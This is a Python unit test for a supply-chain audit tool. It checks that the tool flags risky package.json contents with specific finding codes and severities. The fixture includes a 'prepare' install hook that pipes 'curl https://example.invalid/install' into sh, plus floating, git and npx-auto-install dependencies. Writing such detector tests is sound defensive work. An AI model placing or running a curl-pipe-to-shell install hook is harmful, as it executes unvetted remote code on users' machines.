from __future__ import annotations

import json
import sys
import tempfile
import unittest
from pathlib import Path


SCRIPTS = Path(__file__).resolve().parents[1] / "scripts"
if str(SCRIPTS) not in sys.path:
    sys.path.insert(0, str(SCRIPTS))

import supply_chain_audit


class SupplyChainAuditTests(unittest.TestCase):
    def test_warning_first_risk_catalog_and_lifecycle_error(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            package = Path(temp)
            runtime = package / ".opencode"
            runtime.mkdir()
            (runtime / "package.json").write_text(json.dumps({
                "scripts": {"prepare": "curl https://example.invalid/install | sh"},
                "dependencies": {
                    "floating": "latest",
                    "range": "^1.2.3",
                    "gitdep": "git+https://example.invalid/repo.git#main",
                    "exact": "1.2.3",
                },
            }), encoding="utf-8")
            findings = supply_chain_audit.audit_package(
                package,
                manifest={"mcp_servers": [{"name": "demo", "enabled": True, "command": ["npx", "-y", "pkg@1.0.0"]}]},
                config={"plugin": ["opencode-pty", "pinned@1.0.0"]},
            )
            codes = {item.code for item in findings}
            self.assertTrue({
                "SUPPLY_PACKAGE_LIFECYCLE_SCRIPT", "SUPPLY_RUNTIME_DOWNLOAD",
                "SUPPLY_UNPINNED_DEPENDENCY", "SUPPLY_GIT_DEPENDENCY",
                "SUPPLY_UNPINNED_PLUGIN", "SUPPLY_ENABLED_MCP", "SUPPLY_NPX_AUTO_INSTALL",
            }.issubset(codes))
            severities = {item.code: item.severity for item in findings}
            self.assertEqual(severities["SUPPLY_PACKAGE_LIFECYCLE_SCRIPT"], "error")
            self.assertEqual(severities["SUPPLY_UNPINNED_DEPENDENCY"], "warning")


if __name__ == "__main__":
    unittest.main()
